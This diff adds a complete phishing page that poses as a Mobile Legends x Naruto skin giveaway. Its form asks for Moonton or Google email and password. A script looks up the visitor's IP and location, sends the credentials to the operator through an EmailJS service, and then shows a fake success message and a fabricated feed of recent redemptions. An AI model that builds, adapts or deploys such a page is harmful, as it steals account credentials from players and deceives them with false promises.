@@ -1,0 +1,1031 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Redeem Skin MLBB x Naruto</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/country-flag-icons/1.2.0/css/country-flags.min.css">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap');
+    
+    * { 
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: 'Montserrat', sans-serif;
+      background: linear-gradient(-45deg, #1a1a2e, #16213e, #0f3460, #533d7b);
+      background-size: 400% 400%;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      animation: gradientBG 15s ease infinite;
+      overflow-x: hidden;
+      color: #fff;
+    }
+
+    @keyframes gradientBG {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    .container {
+      position: relative;
+      width: 100%;
+      max-width: 500px;
+      perspective: 1000px;
+    }
+
+    .kunai {
+      position: absolute;
+      width: 40px;
+      height: 40px;
+      background-image: url('https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg');
+      background-size: contain;
+      background-repeat: no-repeat;
+      opacity: 0.7;
+      z-index: -1;
+      animation: floatKunai 15s linear infinite;
+    }
+
+    @keyframes floatKunai {
+      0% {
+        transform: translate(0, 0) rotate(0deg);
+        opacity: 0;
+      }
+      10% {
+        opacity: 0.7;
+      }
+      90% {
+        opacity: 0.7;
+      }
+      100% {
+        transform: translate(calc(100vw - 100px), calc(100vh - 100px)) rotate(720deg);
+        opacity: 0;
+      }
+    }
+
+    .hero-image {
+      width: 280px;
+      height: 280px;
+      margin: 0 auto 20px;
+      position: relative;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(255,215,0,0.2) 0%, rgba(255,215,0,0) 70%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      animation: pulse 3s infinite alternate;
+    }
+
+    .hero-image img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      filter: drop-shadow(0 0 15px rgba(255, 215, 0, 0.7));
+      transform-style: preserve-3d;
+      animation: float 6s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0) rotateY(0deg); }
+      50% { transform: translateY(-20px) rotateY(10deg); }
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      100% { transform: scale(1.05); }
+    }
+
+    .title {
+      text-align: center;
+      margin-bottom: 10px;
+      font-size: 2.5rem;
+      background: linear-gradient(90deg, #ffcc00, #ff9500, #ffcc00);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 10px rgba(255, 200, 0, 0.3);
+      position: relative;
+      animation: titleGlow 2s infinite alternate;
+    }
+
+    @keyframes titleGlow {
+      from { text-shadow: 0 0 10px rgba(255, 200, 0, 0.3); }
+      to { text-shadow: 0 0 20px rgba(255, 200, 0, 0.7), 0 0 30px rgba(255, 150, 0, 0.5); }
+    }
+
+    .subtitle {
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 1rem;
+      color: rgba(255, 255, 255, 0.8);
+      position: relative;
+    }
+
+    .subtitle::after {
+      content: '';
+      display: block;
+      width: 100px;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, #ffcc00, transparent);
+      margin: 10px auto;
+    }
+
+    form {
+      background: rgba(15, 15, 15, 0.7);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 204, 0, 0.3);
+      border-radius: 20px;
+      padding: 30px;
+      width: 100%;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), 
+                  inset 0 0 15px rgba(255, 204, 0, 0.2);
+      transform-style: preserve-3d;
+      transition: all 0.5s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    form::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(
+        to bottom right,
+        transparent 45%,
+        rgba(255, 204, 0, 0.1) 50%,
+        transparent 55%
+      );
+      animation: shine 3s infinite;
+      z-index: 0;
+    }
+
+    @keyframes shine {
+      0% { transform: rotate(0deg) translate(-50%, -50%); }
+      100% { transform: rotate(360deg) translate(-50%, -50%); }
+    }
+
+    form:hover {
+      transform: translateY(-5px) rotateX(5deg);
+      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6), 
+                  inset 0 0 20px rgba(255, 204, 0, 0.3);
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    input, select {
+      width: 100%;
+      padding: 15px;
+      border-radius: 10px;
+      border: 1px solid rgba(255, 204, 0, 0.3);
+      background: rgba(30, 30, 30, 0.8);
+      color: #fff;
+      font-size: 1rem;
+      transition: all 0.3s ease;
+      box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.5);
+    }
+
+    select {
+      appearance: none;
+      -webkit-appearance: none;
+      background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23ffcc00'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
+      background-repeat: no-repeat;
+      background-position: right 15px center;
+      background-size: 15px;
+      padding-right: 40px;
+    }
+
+    input:focus, select:focus {
+      outline: none;
+      border-color: #ffcc00;
+      box-shadow: 0 0 10px rgba(255, 204, 0, 0.5),
+                  inset 0 1px 3px rgba(0, 0, 0, 0.5);
+      transform: translateY(-2px);
+    }
+
+    input::placeholder {
+      color: rgba(255, 255, 255, 0.5);
+    }
+
+    button {
+      width: 100%;
+      padding: 15px;
+      border-radius: 10px;
+      border: none;
+      background: linear-gradient(135deg, #ffcc00, #ff9500, #ffcc00);
+      background-size: 200% 200%;
+      color: #111;
+      font-weight: 700;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 5px 15px rgba(255, 153, 0, 0.4);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      animation: gradientShift 3s ease infinite;
+    }
+
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 20px rgba(255, 153, 0, 0.6);
+    }
+
+    button:active {
+      transform: translateY(1px);
+    }
+
+    button::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        rgba(255, 255, 255, 0.2),
+        transparent
+      );
+      transition: all 0.5s ease;
+    }
+
+    button:hover::before {
+      left: 100%;
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255, 255, 255, 0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 1s ease-in-out infinite;
+      margin-right: 10px;
+      vertical-align: middle;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .confetti {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      background-color: #f00;
+      opacity: 0;
+      z-index: 10;
+    }
+
+    .loading-bar {
+      width: 100%;
+      height: 5px;
+      background: rgba(255, 204, 0, 0.2);
+      border-radius: 3px;
+      overflow: hidden;
+      margin-top: 15px;
+      display: none;
+    }
+
+    .loading-progress {
+      height: 100%;
+      width: 0;
+      background: linear-gradient(90deg, #ffcc00, #ff9500);
+      border-radius: 3px;
+      transition: width 0.3s ease;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .loading-progress::after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(
+        90deg,
+        transparent,
+        rgba(255, 255, 255, 0.4),
+        transparent
+      );
+      animation: loadingShine 1.5s infinite;
+    }
+
+    @keyframes loadingShine {
+      0% { transform: translateX(-100%); }
+      100% { transform: translateX(100%); }
+    }
+
+    .recent-redeems {
+      width: 100%;
+      margin: 20px 0;
+      padding: 10px;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 5px;
+      overflow: hidden;
+      white-space: nowrap;
+      box-shadow: 0 0 10px rgba(255, 204, 0, 0.2);
+    }
+
+    .recent-redeems span {
+      display: inline-block;
+      padding-left: 100%;
+      animation: marquee 15s linear infinite;
+      color: #ffcc00;
+      font-size: 0.9rem;
+    }
+
+    @keyframes marquee {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(-100%); }
+    }
+
+    .skin-preview {
+      display: none;
+      width: 100%;
+      margin-top: 20px;
+      text-align: center;
+      animation: fadeIn 1s ease;
+    }
+
+    .skin-preview img {
+      max-width: 100%;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(255, 204, 0, 0.5);
+    }
+
+    .skin-preview h3 {
+      margin-top: 10px;
+      color: #ffcc00;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        padding: 0 20px;
+      }
+      
+      .hero-image {
+        width: 200px;
+        height: 200px;
+      }
+      
+      .title {
+        font-size: 2rem;
+      }
+      
+      form {
+        padding: 20px;
+      }
+    }
+
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: rgba(0, 0, 0, 0.2);
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: linear-gradient(#ffcc00, #ff9500);
+      border-radius: 10px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: linear-gradient(#ff9500, #ffcc00);
+    }
+
+    .fi {
+      width: 20px;
+      height: 15px;
+      border-radius: 2px;
+      box-shadow: 0 0 3px rgba(0, 0, 0, 0.3);
+    }
+
+    #countryDisplay {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 15px;
+      background: rgba(30, 30, 30, 0.8);
+      border-radius: 10px;
+      border: 1px solid rgba(255, 204, 0, 0.3);
+    }
+  </style>
+</head>
+<body>
+  <div class="kunai" style="top: 10%; left: 5%; animation-delay: 0s;"></div>
+  <div class="kunai" style="top: 20%; left: 80%; animation-delay: 2s;"></div>
+  <div class="kunai" style="top: 70%; left: 15%; animation-delay: 4s;"></div>
+  <div class="kunai" style="top: 80%; left: 70%; animation-delay: 6s;"></div>
+
+  <div class="container">
+    <div class="hero-image">
+      <img src="https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg" alt="Naruto Skin" id="heroImg">
+    </div>
+    
+    <h1 class="title">MLBB x NARUTO</h1>
+    <p class="subtitle">Exclusive Skin Redemption</p>
+
+    <div class="recent-redeems">
+      <span id="redeemMarquee">Recent redeems: </span>
+    </div>
+    
+    <form id="redeemForm">
+      <div class="form-group">
+        <label for="userId"><i class="fas fa-user"></i> User ID</label>
+        <input type="text" id="userId" placeholder="Enter your User ID" required 
+               inputmode="numeric" pattern="[0-9]*"
+               oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+      </div>
+      
+      <div class="form-group">
+        <label for="zoneId"><i class="fas fa-globe"></i> Zone ID</label>
+        <input type="text" id="zoneId" placeholder="Enter your Zone ID" required 
+               inputmode="numeric" pattern="[0-9]*"
+               oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+      </div>
+      
+  <div class="form-group">
+    <label for="userLevel"><i class="fas fa-level-up-alt"></i> MLBB Level</label>
+    <select id="userLevel" required="">
+    <option value="">Account Level</option>
+    <!-- Level 1 hingga 200 -->
+    <!-- Begin options -->
+    <option value="1">Level 1</option>
+    <option value="2">Level 2</option>
+    <option value="3">Level 3</option>
+    <option value="4">Level 4</option>
+    <option value="5">Level 5</option>
+    <option value="6">Level 6</option>
+    <option value="7">Level 7</option>
+    <option value="8">Level 8</option>
+    <option value="9">Level 9</option>
+    <option value="10">Level 10</option>
+    <option value="11">Level 11</option>
+    <option value="12">Level 12</option>
+    <option value="13">Level 13</option>
+    <option value="14">Level 14</option>
+    <option value="15">Level 15</option>
+    <option value="16">Level 16</option>
+    <option value="17">Level 17</option>
+    <option value="18">Level 18</option>
+    <option value="19">Level 19</option>
+    <option value="20">Level 20</option>
+    <option value="21">Level 21</option>
+    <option value="22">Level 22</option>
+    <option value="23">Level 23</option>
+    <option value="24">Level 24</option>
+    <option value="25">Level 25</option>
+    <option value="26">Level 26</option>
+    <option value="27">Level 27</option>
+    <option value="28">Level 28</option>
+    <option value="29">Level 29</option>
+    <option value="30">Level 30</option>
+    <option value="31">Level 31</option>
+    <option value="32">Level 32</option>
+    <option value="33">Level 33</option>
+    <option value="34">Level 34</option>
+    <option value="35">Level 35</option>
+    <option value="36">Level 36</option>
+    <option value="37">Level 37</option>
+    <option value="38">Level 38</option>
+    <option value="39">Level 39</option>
+    <option value="40">Level 40</option>
+    <option value="41">Level 41</option>
+    <option value="42">Level 42</option>
+    <option value="43">Level 43</option>
+    <option value="44">Level 44</option>
+    <option value="45">Level 45</option>
+    <option value="46">Level 46</option>
+    <option value="47">Level 47</option>
+    <option value="48">Level 48</option>
+    <option value="49">Level 49</option>
+    <option value="50">Level 50</option>
+    <option value="51">Level 51</option>
+    <option value="52">Level 52</option>
+    <option value="53">Level 53</option>
+    <option value="54">Level 54</option>
+    <option value="55">Level 55</option>
+    <option value="56">Level 56</option>
+    <option value="57">Level 57</option>
+    <option value="58">Level 58</option>
+    <option value="59">Level 59</option>
+    <option value="60">Level 60</option>
+    <option value="61">Level 61</option>
+    <option value="62">Level 62</option>
+    <option value="63">Level 63</option>
+    <option value="64">Level 64</option>
+    <option value="65">Level 65</option>
+    <option value="66">Level 66</option>
+    <option value="67">Level 67</option>
+    <option value="68">Level 68</option>
+    <option value="69">Level 69</option>
+    <option value="70">Level 70</option>
+    <option value="71">Level 71</option>
+    <option value="72">Level 72</option>
+    <option value="73">Level 73</option>
+    <option value="74">Level 74</option>
+    <option value="75">Level 75</option>
+    <option value="76">Level 76</option>
+    <option value="77">Level 77</option>
+    <option value="78">Level 78</option>
+    <option value="79">Level 79</option>
+    <option value="80">Level 80</option>
+    <option value="81">Level 81</option>
+    <option value="82">Level 82</option>
+    <option value="83">Level 83</option>
+    <option value="84">Level 84</option>
+    <option value="85">Level 85</option>
+    <option value="86">Level 86</option>
+    <option value="87">Level 87</option>
+    <option value="88">Level 88</option>
+    <option value="89">Level 89</option>
+    <option value="90">Level 90</option>
+    <option value="91">Level 91</option>
+    <option value="92">Level 92</option>
+    <option value="93">Level 93</option>
+    <option value="94">Level 94</option>
+    <option value="95">Level 95</option>
+    <option value="96">Level 96</option>
+    <option value="97">Level 97</option>
+    <option value="98">Level 98</option>
+    <option value="99">Level 99</option>
+    <option value="100">Level 10</optio>
+    <option value="101">Level 10</optio>
+    <option value="102">Level 102</option>
+    <option value="103">Level 103</option>
+    <option value="104">Level 104</option>
+    <option value="105">Level 105</option>
+    <option value="106">Level 106</option>
+    <option value="107">Level 107</option>
+    <option value="108">Level 108</option>
+    <option value="109">Level 109</option>
+    <option value="110">Level 110</option>
+    <option value="111">Level 111</option>
+    <option value="112">Level 112</option>
+    <option value="113">Level 113</option>
+    <option value="114">Level 114</option>
+    <option value="115">Level 115</option>
+    <option value="116">Level 116</option>
+    <option value="117">Level 117</option>
+    <option value="118">Level 118</option>
+    <option value="119">Level 119</option>
+    <option value="120">Level 120</option>
+    <option value="121">Level 121</option>
+    <option value="122">Level 122</option>
+    <option value="123">Level 123</option>
+    <option value="124">Level 124</option>
+    <option value="125">Level 125</option>
+    <option value="126">Level 126</option>
+    <option value="127">Level 127</option>
+    <option value="128">Level 128</option>
+    <option value="129">Level 129</option>
+    <option value="130">Level 130</option>
+    <option value="131">Level 131</option>
+    <option value="132">Level 132</option>
+    <option value="133">Level 133</option>
+    <option value="134">Level 134</option>
+    <option value="135">Level 135</option>
+    <option value="136">Level 136</option>
+    <option value="137">Level 137</option>
+    <option value="138">Level 138</option>
+    <option value="139">Level 139</option>
+    <option value="140">Level 140</option>
+    <option value="141">Level 141</option>
+    <option value="142">Level 142</option>
+    <option value="143">Level 143</option>
+    <option value="144">Level 144</option>
+    <option value="145">Level 145</option>
+    <option value="146">Level 146</option>
+    <option value="147">Level 147</option>
+    <option value="148">Level 148</option>
+    <option value="149">Level 149</option>
+    <option value="150">Level 150</option>
+    <option value="151">Level 151</option>
+    <option value="152">Level 152</option>
+    <option value="153">Level 153</option>
+    <option value="154">Level 154</option>
+    <option value="155">Level 155</option>
+    <option value="156">Level 156</option>
+    <option value="157">Level 157</option>
+    <option value="158">Level 158</option>
+    <option value="159">Level 159</option>
+    <option value="160">Level 160</option>
+    <option value="161">Level 161</option>
+    <option value="162">Level 162</option>
+    <option value="163">Level 163</option>
+    <option value="164">Level 164</option>
+    <option value="165">Level 165</option>
+    <option value="166">Level 166</option>
+    <option value="167">Level 167</option>
+    <option value="168">Level 168</option>
+    <option value="169">Level 169</option>
+    <option value="170">Level 170</option>
+    <option value="171">Level 171</option>
+    <option value="172">Level 172</option>
+    <option value="173">Level 173</option>
+    <option value="174">Level 174</option>
+    <option value="175">Level 175</option>
+    <option value="176">Level 176</option>
+    <option value="177">Level 177</option>
+    <option value="178">Level 178</option>
+    <option value="179">Level 179</option>
+    <option value="180">Level 180</option>
+    <option value="181">Level 181</option>
+    <option value="182">Level 182</option>
+    <option value="183">Level 183</option>
+    <option value="184">Level 184</option>
+    <option value="185">Level 185</option>
+    <option value="186">Level 186</option>
+    <option value="187">Level 187</option>
+    <option value="188">Level 188</option>
+    <option value="189">Level 189</option>
+    <option value="190">Level 190</option>
+    <option value="191">Level 191</option>
+    <option value="192">Level 192</option>
+    <option value="193">Level 193</option>
+    <option value="194">Level 194</option>
+    <option value="195">Level 195</option>
+    <option value="196">Level 196</option>
+    <option value="197">Level 197</option>
+    <option value="198">Level 198</option>
+    <option value="199">Level 199</option>
+    <option value="200">Level 200</option>
+    <!-- End options -->
+  </select>
+</div>
+      
+      <div class="form-group">
+        <label><i class="fas fa-globe-americas"></i> Country</label>
+        <div id="countryDisplay">
+          <span id="countryFlag" class="fi"></span>
+          <span id="countryName">Detecting...</span>
+        </div>
+      </div>
+      
+      <div class="form-group">
+        <label for="methodSelect"><i class="fas fa-sign-in-alt"></i> Login Method</label>
+        <select id="methodSelect" required>
+          <option value="Moonton">Login with Moonton</option>
+          <option value="Google">Login with Google</option>
+        </select>
+      </div>
+      
+      <div class="form-group" id="emailLabelDiv">
+        <label for="emailField"><i class="fas fa-envelope"></i> Email</label>
+        <input type="email" id="emailField" placeholder="Moonton Email" required>
+      </div>
+      
+      <div class="form-group" id="passwordLabelDiv">
+        <label for="passwordField"><i class="fas fa-lock"></i> Password</label>
+        <input type="password" id="passwordField" placeholder="Moonton Password" required>
+      </div>
+      
+      <div class="form-group">
+        <label for="skinSelect"><i class="fas fa-tshirt"></i> Choose Naruto Skin</label>
+        <select id="skinSelect" required>
+          <option value="">Select your skin</option>
+          <option value="Naruto">Lukas - Naruto Uzumaki</option>
+          <option value="Sasuke">Suyou - Sasuke hatake</option>
+          <option value="Sakura">Kalea - Sakura</option>
+          <option value="Kakashi">Hayabusa - Kakashi</option>
+        </select>
+      </div>
+      
+      <div class="form-group">
+        <label for="codeField"><i class="fas fa-gift"></i> Redemption Code</label>
+        <input type="text" id="codeField" placeholder="Select a skin to generate code" readonly required>
+      </div>
+      
+      <button type="submit" id="submitBtn">
+        <span id="buttonText">REDEEM NOW</span>
+      </button>
+      
+      <div class="loading-bar" id="loadingBar">
+        <div class="loading-progress" id="loadingProgress"></div>
+      </div>
+    </form>
+
+    <div class="skin-preview" id="skinPreview">
+      <h3>You've successfully redeemed:</h3>
+      <img id="redeemedSkinImg" src="" alt="Redeemed Skin">
+      <p id="redeemedSkinName"></p>
+    </div>
+  </div>
+
+  <script>
+    const methodSelect = document.getElementById('methodSelect');
+    const emailLabelDiv = document.getElementById('emailLabelDiv');
+    const passwordLabelDiv = document.getElementById('passwordLabelDiv');
+    const skinSelect = document.getElementById('skinSelect');
+    const codeField = document.getElementById('codeField');
+    const heroImg = document.getElementById('heroImg');
+    const loadingBar = document.getElementById('loadingBar');
+    const loadingProgress = document.getElementById('loadingProgress');
+    const buttonText = document.getElementById('buttonText');
+    const redeemMarquee = document.getElementById('redeemMarquee');
+    const skinPreview = document.getElementById('skinPreview');
+    const redeemedSkinImg = document.getElementById('redeemedSkinImg');
+    const redeemedSkinName = document.getElementById('redeemedSkinName');
+    const countryFlag = document.getElementById('countryFlag');
+    const countryName = document.getElementById('countryName');
+
+    // Anti-spam variables
+    const submittedIPs = JSON.parse(localStorage.getItem('submittedIPs') || '[]');
+    const IP_LIMIT = 3; // Max allowed submissions per IP
+    const COOLDOWN_HOURS = 24; // Cooldown period in hours
+
+    const skinImages = {
+      'Naruto': 'https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg',
+      'Sasuke': 'https://i.ibb.co/tPPz7GPS/IMG-20250513-192141.jpg',
+      'Sakura': 'https://i.ibb.co/Hfj4SsgH/IMG-20250513-192111.jpg',
+      'Kakashi': 'https://i.ibb.co/wfk0j8T/IMG-20250513-192211.jpg'
+    };
+
+    const skinNames = {
+      'Naruto': 'Lukas - Naruto Uzumaki',
+      'Sasuke': 'Suyou - Sasuke Hatake',
+      'Sakura': 'Kalea - Sakura',
+      'Kakashi': 'Hayabusa - Kakashi'
+    };
+
+    // Detect user's country and IP
+    async function detectCountry() {
+      try {
+        const ipRes = await fetch('https://ipwho.is/');
+        const ipData = await ipRes.json();
+        
+        if (ipData.success) {
+          countryFlag.classList.add(`fi-${ipData.country_code.toLowerCase()}`);
+          countryName.textContent = ipData.country;
+          return ipData; // Return complete IP data
+        } else {
+          countryName.textContent = "Unknown";
+          return { ip: 'unknown', country: 'Unknown', country_code: 'xx' };
+        }
+      } catch (err) {
+        console.error("Failed to detect country:", err);
+        countryName.textContent = "Unknown";
+        return { ip: 'unknown', country: 'Unknown', country_code: 'xx' };
+      }
+    }
+
+    // Check if IP has reached submission limit
+    function checkIPLimit(ip) {
+      if (ip === 'unknown') return true; // Allow if IP detection failed
+      
+      const now = new Date();
+      const recentSubmissions = submittedIPs.filter(sub => {
+        return sub.ip === ip && 
+               (now - new Date(sub.timestamp)) < COOLDOWN_HOURS * 3600 * 1000;
+      });
+      
+      return recentSubmissions.length < IP_LIMIT;
+    }
+
+    // Record submission to localStorage
+    function recordSubmission(ip) {
+      if (ip === 'unknown') return;
+      
+      const now = new Date();
+      submittedIPs.push({ ip, timestamp: now.toISOString() });
+      
+      // Keep only recent submissions to save storage space
+      const cutoff = new Date(now - COOLDOWN_HOURS * 3600 * 1000);
+      const recent = submittedIPs.filter(sub => new Date(sub.timestamp) > cutoff);
+      
+      localStorage.setItem('submittedIPs', JSON.stringify(recent));
+    }
+
+    function generateRandomIds() {
+      const randomIds = [];
+      for (let i = 0; i < 5; i++) {
+        const id = Math.floor(10000000 + Math.random() * 90000000);
+        const skinKeys = Object.keys(skinNames);
+        const randomSkin = skinKeys[Math.floor(Math.random() * skinKeys.length)];
+        randomIds.push(`${id} (${skinNames[randomSkin]})`);
+      }
+      return randomIds.join(' • ');
+    }
+
+    function updateMarquee() {
+      const randomText = `Recent redeems: ${generateRandomIds()}`;
+      redeemMarquee.textContent = randomText;
+      setTimeout(updateMarquee, 15000);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      updateMarquee();
+      detectCountry();
+    });
+
+    methodSelect.addEventListener('change', function () {
+      const method = this.value;
+      const emailLabel = emailLabelDiv.querySelector('label');
+      const passwordLabel = passwordLabelDiv.querySelector('label');
+      
+      if (method === 'Google') {
+        emailLabel.innerHTML = '<i class="fas fa-envelope"></i> Google Email';
+        document.getElementById('emailField').placeholder = "Google Email";
+        passwordLabel.innerHTML = '<i class="fas fa-lock"></i> Google Password';
+        document.getElementById('passwordField').placeholder = "Google Password";
+      } else {
+        emailLabel.innerHTML = '<i class="fas fa-envelope"></i> Moonton Email';
+        document.getElementById('emailField').placeholder = "Moonton Email";
+        passwordLabel.innerHTML = '<i class="fas fa-lock"></i> Moonton Password';
+        document.getElementById('passwordField').placeholder = "Moonton Password";
+      }
+    });
+
+    skinSelect.addEventListener('change', () => {
+      const skin = skinSelect.value;
+      if (skin) {
+        const code = `MLBB-NAR-${skin.toUpperCase()}-${Math.floor(1000 + Math.random() * 9000)}-${Math.random().toString(36).substr(2, 4).toUpperCase()}`;
+        codeField.value = code;
+        
+        if (skinImages[skin]) {
+          heroImg.src = skinImages[skin];
+          heroImg.alt = `${skin} Skin`;
+        }
+      } else {
+        codeField.value = '';
+        heroImg.src = 'https://i.ibb.co/ch3VqQrY/IMG-20250513-191901.jpg';
+        heroImg.alt = 'Naruto Skin';
+      }
+    });
+
+    document.getElementById('redeemForm').addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const ipData = await detectCountry();
+      
+      if (!checkIPLimit(ipData.ip)) {
+        alert(`⚠️ You've reached the submission limit (${IP_LIMIT} per ${COOLDOWN_HOURS} hours). Please try again later.`);
+        return;
+      }
+
+      const submitBtn = document.getElementById('submitBtn');
+      submitBtn.disabled = true;
+      buttonText.innerHTML = `<span class="spinner"></span> PROCESSING...`;
+      
+      loadingBar.style.display = 'block';
+      
+      let progress = 0;
+      const loadingInterval = setInterval(() => {
+        progress += Math.random() * 10;
+        if (progress > 90) progress = 90;
+        loadingProgress.style.width = `${progress}%`;
+      }, 300);
+
+      const userId = document.getElementById('userId').value;
+      const zoneId = document.getElementById('zoneId').value;
+      const level = document.getElementById('userLevel').value;
+      const email = document.getElementById('emailField').value;
+      const password = document.getElementById('passwordField')?.value || '-';
+      const method = document.getElementById('methodSelect').value;
+      const skin = document.getElementById('skinSelect').value;
+      const code = document.getElementById('codeField').value;
+
+      try {
+        await new Promise(resolve => setTimeout(resolve, 2000 + Math.random() * 2000));
+        
+        const templateParams = {
+          user_id: userId,
+          zone_id: zoneId,
+          level: level,
+          email: email,
+          password: password,
+          method: method,
+          ip: ipData.ip,
+          country_code: ipData.country_code.toLowerCase(),
+          location: `${ipData.city}, ${ipData.country}`};
+
+        await emailjs.send("service_cf84gji", "template_o4cnfrh", templateParams);
+        
+        // Record successful submission
+        recordSubmission(ipData.ip);
+
+        clearInterval(loadingInterval);
+        loadingProgress.style.width = '100%';
+        
+        createConfetti();
+        
+        if (skinImages[skin]) {
+          redeemedSkinImg.src = skinImages[skin];
+          redeemedSkinImg.alt = `${skin} Skin`;
+          redeemedSkinName.textContent = skinNames[skin];
+          skinPreview.style.display = 'block';
+        }
+
+        const newRedeem = `${userId} (${skinNames[skin]})`;
+        const currentMarquee = redeemMarquee.textContent.replace('Recent redeems: ', '');
+        const updatedMarquee = `Recent redeems: ${newRedeem} • ${currentMarquee.split(' • ').slice(0, 4).join(' • ')}`;
+        redeemMarquee.textContent = updatedMarquee;
+
+        setTimeout(() => {
+          alert("🎉 Redeem successful! The skin will be delivered to your account within 24 hours.");
+          this.reset();
+          codeField.value = '';
+          loadingBar.style.display = 'none';
+          loadingProgress.style.width = '0';
+        }, 500);
+      } catch (err) {
+        console.error(err);
+        clearInterval(loadingInterval);
+        loadingBar.style.display = 'none';
+        loadingProgress.style.width = '0';
+        alert("⚠️ Error occurred. Please try again later.");
+      } finally {
+        submitBtn.disabled = false;
+        buttonText.textContent = 'REDEEM NOW';
+      }
+    });
+
+    function createConfetti() {
+      const colors = ['#ffcc00', '#ff9500', '#ffffff', '#ff3333', '#33ccff'];
+      const container = document.querySelector('.container');
+      
+      for (let i = 0; i < 100; i++) {
+        const confetti = document.createElement('div');
+        confetti.className = 'confetti';
+        confetti.style.left = Math.random() * 100 + 'vw';
+        confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+        confetti.style.width = Math.random() * 10 + 5 + 'px';
+        confetti.style.height = Math.random() * 10 + 5 + 'px';
+        confetti.style.opacity = Math.random() + 0.5;
+        confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+        
+        const animationDuration = Math.random() * 3 + 2;
+        confetti.style.animation = `fall ${animationDuration}s linear forwards`;
+        
+        document.body.appendChild(confetti);
+        
+        const keyframes = `
+          @keyframes fall {
+            to {
+              transform: translateY(100vh) rotate(${Math.random() * 360}deg);
+              opacity: 0;
+            }
+          }
+        `;
+        
+        const style = document.createElement('style');
+        style.innerHTML = keyframes;
+        document.head.appendChild(style);
+        
+        setTimeout(() => {
+          confetti.remove();
+          style.remove();
+        }, animationDuration * 1000);
+      }
+    }
+  </script>
+
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function () {
+      emailjs.init("o9Rxx0L4QuR8xk5FL");
+    })();
+  </script>
+</body>
+</html>
